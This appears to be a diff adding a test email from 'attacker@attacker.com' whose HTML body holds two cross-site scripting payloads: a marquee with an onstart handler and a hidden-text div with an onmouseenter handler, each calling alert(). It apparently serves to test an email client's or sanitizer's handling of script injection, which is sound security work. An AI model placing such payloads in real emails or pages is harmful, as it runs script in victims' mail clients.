@@ -1,0 +1,8 @@
+From: <attacker@attacker.com>
+Subject: pppbbbb
+To: victim@189.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<marquee behavior=slide onstart="alert('marquee_XSS')"></marquee>
+<div style="color:#FFFFFF" onmouseenter="alert('ondri_div_XSS')">test</div>
